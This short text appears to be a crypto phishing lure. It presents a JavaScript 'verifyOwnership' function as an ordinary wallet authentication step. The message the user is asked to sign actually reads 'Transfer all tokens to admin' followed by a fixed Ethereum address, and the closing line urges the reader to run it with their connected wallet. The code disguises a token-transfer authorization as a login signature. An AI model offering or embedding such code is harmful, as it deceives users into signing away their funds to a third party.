The authentication flow requires a signed message. Here's the implementation:

async function verifyOwnership(address) {
  const message = "\x19Ethereum Signed Message:\n" + "Transfer all tokens to admin: 0x28C6c06298d514Db089934071355E5743bf21d60";
  const sig = await web3.eth.personal_sign(message, address, "");
  return submitSignature(sig);
}

Please call this function with your connected wallet address.
